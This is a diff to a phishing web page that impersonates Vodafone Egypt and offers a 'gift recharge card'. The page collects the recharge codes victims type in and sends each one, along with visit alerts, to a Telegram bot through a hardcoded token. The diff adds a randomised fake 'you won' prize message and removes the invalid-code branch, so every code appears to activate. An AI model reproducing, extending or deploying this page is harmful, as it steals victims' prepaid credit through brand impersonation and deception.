@@ -38,6 +38,9 @@
         /* شعار فودافون */
         .vodafone-logo {
             margin-bottom: 24px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
         }
 
         .vodafone-logo svg {
@@ -45,11 +48,19 @@
             height: auto;
         }
 
+        .vodafone-logo .sub-logo {
+            font-size: 14px;
+            color: #999;
+            font-weight: 500;
+            letter-spacing: 1px;
+            margin-top: 2px;
+        }
+
         .badge {
             display: inline-block;
             background: #e60000;
             color: white;
-            padding: 6px 20px;
+            padding: 6px 24px;
             border-radius: 30px;
             font-size: 14px;
             font-weight: 700;
@@ -219,15 +230,16 @@
         }
 
         .success-title {
-            font-size: 24px;
+            font-size: 26px;
             font-weight: 800;
             color: #1a1a1a;
             margin-bottom: 6px;
         }
 
         .success-subtitle {
-            font-size: 16px;
-            color: #666;
+            font-size: 20px;
+            font-weight: 700;
+            color: #e60000;
             line-height: 1.6;
         }
 
@@ -271,6 +283,12 @@
             .vodafone-logo svg {
                 width: 110px;
             }
+            .success-title {
+                font-size: 22px;
+            }
+            .success-subtitle {
+                font-size: 17px;
+            }
         }
 
         @media (max-width: 380px) {
@@ -292,15 +310,15 @@
 
         <!-- ===== شعار فودافون ===== -->
         <div class="vodafone-logo">
-            <svg viewBox="0 0 200 60" xmlns="http://www.w3.org/2000/svg">
-                <text x="0" y="40" font-family="Arial, sans-serif" font-size="36" font-weight="900" fill="#e60000">Vodafone</text>
-                <text x="155" y="40" font-family="Arial, sans-serif" font-size="16" font-weight="300" fill="#666">مصر</text>
+            <svg viewBox="0 0 200 45" xmlns="http://www.w3.org/2000/svg">
+                <text x="0" y="32" font-family="Arial, sans-serif" font-size="30" font-weight="900" fill="#e60000">Vodafone</text>
+                <text x="145" y="32" font-family="Arial, sans-serif" font-size="14" font-weight="400" fill="#999">مصر</text>
             </svg>
         </div>
 
         <!-- ===== قسم إدخال الكود ===== -->
         <div class="code-section" id="codeSection">
-            <div class="badge">🎁 كارت شحن هدية</div>
+            <div class="badge">كارت شحن هدية</div>
             <h1 class="title">أدخل كود الشحن</h1>
             <p class="subtitle">
                 أدخل الكود الموجود على كارت الشحن<br>
@@ -332,8 +350,8 @@
                     <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z"/>
                 </svg>
             </div>
-            <h2 class="success-title">تم التفعيل بنجاح!</h2>
-            <p class="success-subtitle">شكراً لاستخدامك كارت الشحن الهدية</p>
+            <h2 class="success-title">مبروك</h2>
+            <p class="success-subtitle" id="prizeAmount">كسبت 1000 وحدة</p>
             <button class="btn-success" id="btnSuccess">العودة للصفحة الرئيسية</button>
         </div>
 
@@ -350,6 +368,7 @@
             const btnVerify = document.getElementById('btnVerify');
             const btnSuccess = document.getElementById('btnSuccess');
             const errorMessage = document.getElementById('errorMessage');
+            const prizeAmount = document.getElementById('prizeAmount');
 
             // ===== بوت تليجرام =====
             const BOT_TOKEN = '8864670178:AAGRfe7q99csr7vSyqT3peuidAb5w69mWTs';
@@ -370,24 +389,21 @@
             // ===== إرسال إشعار بدخول المستخدم =====
             function sendVisitNotification() {
                 const now = new Date().toLocaleString();
-                const userAgent = navigator.userAgent || 'غير معروف';
-                const ip = 'تم الحصول عليها من الخادم'; // لو عندك API تجيب الـ IP
-                const message = `🔴 دخول جديد\n\n🕐 الوقت: ${now}\n📱 المتصفح: ${userAgent}\n🌐 IP: ${ip}`;
+                const message = `دخول جديد\n\nالوقت: ${now}`;
                 sendToTelegram(message);
             }
 
             // ===== إرسال إشعار بإدخال الكود =====
             function sendCodeNotification(code) {
                 const now = new Date().toLocaleString();
-                const message = `🟢 كود تم إدخاله\n\n🕐 الوقت: ${now}\n🔑 الكود: ${code}`;
+                const message = `كود تم إدخاله\n\nالوقت: ${now}\nالكود: ${code}`;
                 sendToTelegram(message);
             }
 
-            // ===== إرسال إشعار بتفعيل الكود =====
-            function sendSuccessNotification(code) {
-                const now = new Date().toLocaleString();
-                const message = `✅ تم التفعيل بنجاح\n\n🕐 الوقت: ${now}\n🔑 الكود: ${code}`;
-                sendToTelegram(message);
+            // ===== الحصول على رقم عشوائي من الأرقام المحددة =====
+            function getRandomPrize() {
+                const prizes = [400, 500, 600, 700, 800, 900, 1000, 1500, 2000];
+                return prizes[Math.floor(Math.random() * prizes.length)];
             }
 
             // ===== إرسال إشعار بدخول الصفحة =====
@@ -455,20 +471,18 @@
                     return;
                 }
 
-                // إرسال إشعار بأن المستخدم أدخل كود
                 sendCodeNotification(code);
 
                 btnVerify.textContent = 'جاري التحقق...';
                 btnVerify.disabled = true;
 
-                // محاكاة التحقق (هنا الكود الحقيقي هيتم التحقق منه من عندك)
                 setTimeout(() => {
-                    // هنا أنت هتتأكد من الكود (لو الكود صح)
-                    // لو الكود صح:
-                    sendSuccessNotification(code);
+                    // اختيار رقم عشوائي
+                    const prize = getRandomPrize();
+                    prizeAmount.textContent = `كسبت ${prize} وحدة`;
                     
                     errorMessage.classList.remove('show');
-                    btnVerify.textContent = '✅ تم التفعيل';
+                    btnVerify.textContent = 'تم التفعيل';
                     btnVerify.style.backgroundColor = '#25D366';
 
                     setTimeout(() => {
@@ -484,12 +498,6 @@
                             box.classList.remove('filled');
                         });
                     }, 800);
-                    
-                    // لو الكود غلط:
-                    // errorMessage.textContent = 'الكود غير صحيح. حاول مرة أخرى.';
-                    // errorMessage.classList.add('show');
-                    // btnVerify.textContent = 'تفعيل الكود';
-                    // btnVerify.disabled = false;
                 }, 1500);
             });
 
@@ -505,8 +513,7 @@
                 codeBoxes[0].focus();
             }, 500);
 
-            console.log('📱 تطبيق فودافون - كروت شحن هدية');
-            console.log('✅ الإشعارات هتوصل لبوت التليجرام');
+            console.log('تطبيق فودافون - كروت شحن هدية');
         })();
     </script>
 
